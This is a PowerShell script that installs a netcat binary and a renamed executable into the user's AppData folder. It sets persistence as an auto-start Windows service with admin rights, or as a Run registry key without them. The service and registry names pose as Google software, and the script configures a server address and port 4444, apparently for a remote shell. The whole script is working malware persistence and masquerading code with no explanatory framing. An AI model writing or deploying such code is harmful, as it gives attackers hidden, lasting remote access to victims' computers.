$appDataRoamingPath = $env:APPDATA
$scriptDir = $PSScriptRoot
$serverAddress = "127.0.0.1"
$serverPort = "4444"
$grgHomeDir = "$appDataRoamingPath\grg";

if (!(Test-Path -Path $grgHomeDir -PathType Container)) {
    Write-Output "$grgHomeDir does not exist! Creating..."
    mkdir "$appDataRoamingPath\grg" 2> $null
}

if (!(Test-Path -Path "$grgHomeDir\nc.exe")) {
    Write-Output "nc.exe not found in home dir... Copying"
    copy "$scriptDir\nc.exe" "$grgHomeDir\nc.exe" 2> $null
}

if (!(Test-Path -Path "$grgHomeDir\chromegrosstart.exe")) {
    Write-Output "chromegrosstart.exe not found in home dir... Copying"
    copy "$scriptDir\runner.exe" "$grgHomeDir\chromegrosstart.exe" 2> $null
}
copy "$scriptDir\nc.exe" "$grgHomeDir\nc.exe" 2> $null
copy "$scriptDir\runner.exe" "$grgHomeDir\chromegrosstart.exe" 2> $null


$IsAdmin = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match "S-1-5-32-544"
if ($IsAdmin) {
    Write-Output "You are running PowerShell with administrative rights."

    Write-Output "Removing old service"
    sc.exe delete "grg" 2> $null
    Write-Output "Creating new service"
    New-Service -Name "grg" `
                -Binary "$grgHomeDir\chromegrosstart.exe" `
                -DisplayName "grg" `
                -Description "Google restoration gross service" `
                -StartupType Automatic 2> $null

    Start-Service -Name "grg"
} else {
    Write-Output "You are not running PowerShell with administrative rights."
    $exePath = "$grgHomeDir\chromegrosstart.exe"

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "Google Gross Manager" -Value $exePath
    Write-Output "Registry entry created for startup."
}


